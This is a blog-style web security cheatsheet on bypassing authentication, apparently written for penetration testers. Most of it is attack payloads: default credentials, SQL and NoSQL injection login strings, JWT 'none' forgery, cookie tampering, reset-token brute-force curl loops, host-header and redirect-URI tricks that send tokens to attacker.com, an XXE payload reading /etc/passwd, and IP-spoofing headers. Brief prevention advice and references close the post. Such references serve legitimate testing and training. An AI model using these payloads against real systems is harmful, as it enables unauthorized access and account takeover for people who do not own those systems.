---
layout: post
title: Authentication Bypass
date: 2025-04-10 17:14 +0300
categories: [Web Security, Server-side]
tags: [authentication]
---

## Introduction

Authentication bypass vulnerabilities allow attackers to gain unauthorized access to systems by circumventing authentication mechanisms. This cheatsheet covers common techniques used to bypass authentication in various applications and frameworks.

## Bypass Techniques by Category

### 1. Default/Weak Credentials

| Application | Default Username | Default Password |
|-------------|-----------------|------------------|
| Cisco Routers | admin | admin |
| Jenkins | admin | password |
| MySQL | root | (blank) |
| Oracle Database | system | manager |
| Tomcat | admin | admin |
| WordPress | admin | admin |
| XAMPP | admin | (blank) |

### 2. SQL Injection Authentication Bypass

#### Basic SQL Injection Payloads

```sql
' OR 1=1 --
' OR '1'='1' --
' OR 1=1 #
" OR 1=1 --
" OR "1"="1" --
' OR '1'='1' /*
admin' --
admin' #
admin'/*
admin' OR '1'='1
admin' OR '1'='1' --
admin' OR '1'='1' #
admin' OR '1'='1' /*
```

#### Advanced SQL Injection Bypasses

```sql
' OR 'x'='x
' OR 0=0 --
' OR 1=1 LIMIT 1 --
'OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1-- -
") OR ("a"="a
") OR ("1"="1
") OR 1 -- -
```

#### Common Vulnerable Login Query Patterns

```sql
-- Vulnerable query
SELECT * FROM users WHERE username='$username' AND password='$password'

-- After injection with ' OR '1'='1' --
SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='anything'
```

### 3. NoSQL Injection Bypasses

#### MongoDB Authentication Bypass

```javascript
// Vulnerable query
db.users.find({username: username, password: password});

// Injection payloads (for POST/GET parameters)
username[$ne]=admin&password[$ne]=
username=admin&password[$regex]=.*
username=admin&password[$exists]=false
username[$in][]=admin&password[$ne]=badpass
{"username": {"$ne": null}, "password": {"$ne": null}}
```

### 4. Authentication Logic Flaws

#### Client-Side Authentication Bypass

```javascript
// Removing client-side validation
// Original check in JavaScript
if (isAuthenticated()) {
  // Show protected content
}

// Bypass by modifying the function in browser console
function isAuthenticated() { return true; }
```

#### Multi-Step Authentication Bypass

```
1. Start authentication process
2. Complete step 1 (e.g., enter username)
3. Note the URL/session state
4. Skip to final step by directly accessing the URL or modifying state
```

#### Parameter Manipulation

```
# Original request
POST /login
username=user&password=pass&admin=false

# Modified request
POST /login
username=user&password=pass&admin=true
```

### 5. Session-Based Bypasses

#### Session Fixation

```
1. Attacker obtains a valid session ID
2. Attacker tricks victim into using that session ID
3. Victim authenticates, upgrading the attacker's known session
```

#### Predictable Session Tokens

```
# Looking for patterns in session tokens
SESS_12345
SESS_12346
SESS_12347

# Generating likely valid tokens
for i in {12300..12400}; do echo "SESS_$i"; done
```

#### Session Puzzle Technique

```
# Request 1: Get a valid session for Application A
GET /app_a/ HTTP/1.1
Host: example.com

# Request 2: Use that session token for Application B
GET /app_b/ HTTP/1.1
Host: example.com
Cookie: session=<token_from_app_a>
```

### 6. Cookie-Based Authentication Bypass

#### Cookie Manipulation

```
# Original cookie
Cookie: authenticated=no; role=user

# Modified cookie
Cookie: authenticated=yes; role=admin
```

#### Base64-Encoded Cookies

```
# Decode
echo "YWRtaW46ZmFsc2U=" | base64 -d
# Result: admin:false

# Modify and encode
echo "admin:true" | base64
# Result: YWRtaW46dHJ1ZQo=
```

#### JWT Token Tampering

```
# Original JWT
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.dz2RcSF50MH9zUKQQrfDzNTsXyYcIV7NB8diOFNKYGE

# Decoded payload
{
  "username": "user",
  "role": "user"
}

# Modified payload (change role to admin, use "none" algorithm)
{
  "alg": "none",
  "typ": "JWT"
}.{
  "username": "user",
  "role": "admin"
}.
```

#### Using "Remember Me" Functionality

```
# Check for remember-me cookies/tokens that can be stolen or forged
Cookie: rememberme=true; auth_token=a1b2c3d4e5f6g7h8i9j0
```

### 7. Password Reset Flaws

#### Host Header Poisoning

```
POST /reset-password HTTP/1.1
Host: attacker.com
...

# Original email link: https://example.com/reset?token=TOKEN
# Modified link: https://attacker.com/reset?token=TOKEN
```

#### Token Leakage in Referrer

```
# Password reset page leaks token in URL
https://example.com/reset?token=a1b2c3d4e5f6

# If the page has external resources, token may leak in Referrer header
```

#### Token Predictability

```
# Simple timestamps or sequential tokens
reset_1649152871
reset_1649152872

# Weak tokens
for i in {1000..9999}; do curl https://example.com/reset?token=$i; done
```

### 8. MFA Bypass Techniques

#### Race Conditions

```
# Make multiple simultaneous authentication requests
curl -s -X POST https://example.com/login -d "username=admin&password=password" &
curl -s -X POST https://example.com/login -d "username=admin&password=password" &
curl -s -X POST https://example.com/login -d "username=admin&password=password" &
```

#### Direct Request to Post-Authentication Page

```
# Skip MFA verification by directly accessing protected pages
GET /dashboard HTTP/1.1
Cookie: session=VALID_SESSION_WITHOUT_MFA
```

#### Response Manipulation

```
# If client receives a JSON response indicating MFA requirement
{"status":"mfa_required","redirect":"/mfa-verification"}

# Modify to:
{"status":"success","redirect":"/dashboard"}
```

### 9. OAuth/OIDC Bypass

#### Client ID/Secret Exposure

```
# Inspect client-side code for exposed OAuth credentials
var client_id = "abc123456789";
var client_secret = "def987654321"; // Should never be in client-side code
```

#### State Parameter Tampering

```
# Original OAuth authorization request
GET /authorize?client_id=CLIENT_ID&redirect_uri=CALLBACK_URL&state=STATE_TOKEN

# Attempt CSRF by removing or replacing state parameter
GET /authorize?client_id=CLIENT_ID&redirect_uri=CALLBACK_URL
```

#### Redirect URI Manipulation

```
# Original redirect URI
redirect_uri=https://example.com/callback

# Manipulated redirect URIs
redirect_uri=https://example.com.attacker.com/callback
redirect_uri=https://example.com%252F@attacker.com
redirect_uri=https://example.com/callback/../../../attacker-controlled-page
```

### 10. Forced Browsing / Direct Page Access

```
# Attempt to directly access protected pages
https://example.com/admin
https://example.com/dashboard
https://example.com/settings
https://example.com/users
https://example.com/config

# Try common protected files
https://example.com/admin.php
https://example.com/console
https://example.com/cp
https://example.com/portal
```

### 11. HTTP Method Manipulation

```
# If POST login is protected but GET isn't
POST /admin HTTP/1.1  # Blocked

GET /admin HTTP/1.1   # Might work
HEAD /admin HTTP/1.1  # Might work
PUT /admin HTTP/1.1   # Might work
OPTIONS /admin HTTP/1.1  # Might work
```

### 12. XML External Entity (XXE) Authentication Bypass

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<userInfo>
 <user>&xxe;</user>
</userInfo>
```

## Advanced Bypass Techniques

### 1. Backend vs. Frontend Validation Mismatch

```javascript
// Frontend validation
if (user.role !== 'admin') {
  hideAdminPanel();
}

// Bypass: Modify DOM or use developer console
document.getElementById('admin-panel').style.display = 'block';
```

### 2. Response Manipulation with Proxy

```
# Original response
HTTP/1.1 302 Found
Location: /login?error=AuthenticationFailed

# Modified response (intercept and change with Burp Suite)
HTTP/1.1 302 Found
Location: /dashboard
```

### 3. Timing Attacks

```python
# Script to test for timing differences in responses
import requests
import time

for username in usernames:
    start_time = time.time()
    r = requests.post('https://example.com/login', data={'username': username, 'password': 'wrong'})
    duration = time.time() - start_time
    print(f"Username: {username}, Time: {duration:.4f}s")
```

### 4. API Authentication Bypass

```
# Original authenticated API call
GET /api/v1/users HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Try without authentication header
GET /api/v1/users HTTP/1.1

# Try with empty token
GET /api/v1/users HTTP/1.1
Authorization: Bearer 

# Try with modified token
GET /api/v1/users HTTP/1.1
Authorization: BEARER eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### 5. Bypassing WAF and IP-Based Authentication

```
# Modified headers to bypass IP restrictions
X-Forwarded-For: 127.0.0.1
X-Original-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
```

## Framework-Specific Bypasses

### WordPress

```
# Direct access to wp-admin
https://example.com/wp-admin/

# XML-RPC authentication bypass
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>password</value></param>
</params>
</methodCall>
```

### PHP

```php
// Type juggling vulnerabilities
// == vs. === comparison issues

// If code uses == for comparison:
// "0e123" == "0e456" evaluates to TRUE (scientific notation)

// Common magic hashes that evaluate to 0 when using ==
// md5('240610708') == '0e462097431906509019562988736854'
// sha1('aaroZmOk') == '0e66507019969427134894567494305185566735'
```

### ASP.NET

```
# ViewState tampering
# Decode ViewState, modify, re-encode (if MAC validation is disabled)

# Padding oracle attacks against older .NET
# Use tools like Padbuster to exploit

# Path traversal in web.config access
https://example.com/path/../web.config
```

### Java

```
# Spring Boot actuator endpoints
https://example.com/actuator
https://example.com/env
https://example.com/trace

# Java deserialization attacks
# Send malicious serialized Java objects to endpoints that deserialize
```

## Detection & Prevention

### 1. Implement Strong Authentication

```
- Multi-factor authentication (MFA)
- OAuth 2.0 with PKCE
- Certificate-based authentication
- Biometric authentication when appropriate
```

### 2. Secure Coding Practices

```
- Server-side validation of ALL authentication steps
- Proper session management
- Secure password storage (bcrypt, Argon2)
- Rate limiting and account lockout policies
- CSRF protection for authentication forms
```

### 3. Best Practices for JWT

```
- Use strong signing keys
- Include expiration (exp) claim
- Validate all parts of the token
- Never accept "none" algorithm
- Use "kid" (key ID) parameter properly
```

### 4. Session Management Security

```
- Regenerate session IDs after authentication
- Set secure and HttpOnly flags on cookies
- Use proper session timeouts
- Implement idle session timeout
```

### 5. API Security

```
- Use OAuth 2.0 or API keys for authentication
- Implement proper rate limiting
- Validate JWTs with proper library
- Use HTTPS for all communications
```

## Testing Tools

### Automated Tools

1. **Burp Suite** - Intercept and modify authentication requests
2. **OWASP ZAP** - Authentication testing tools
3. **Hydra** - Brute forcing authentication
4. **JWT_Tool** - Testing JWT implementations
5. **SQLmap** - Testing for SQL injection in login forms
6. **NoSQLMap** - Testing for NoSQL injection

### Manual Testing Approaches

```
1. Analyze authentication flow completely
2. Test for direct object references
3. Capture and analyze tokens/cookies
4. Test password reset functionality
5. Test MFA implementation
6. Test remember-me functionality
7. Test account lockout mechanisms
```

## References

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - Authentication](https://portswigger.net/web-security/authentication)
- [HackTricks - Authentication Bypass](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)
- [SANS: Top 25 Software Errors - Broken Authentication](https://www.sans.org/top25-software-errors/)


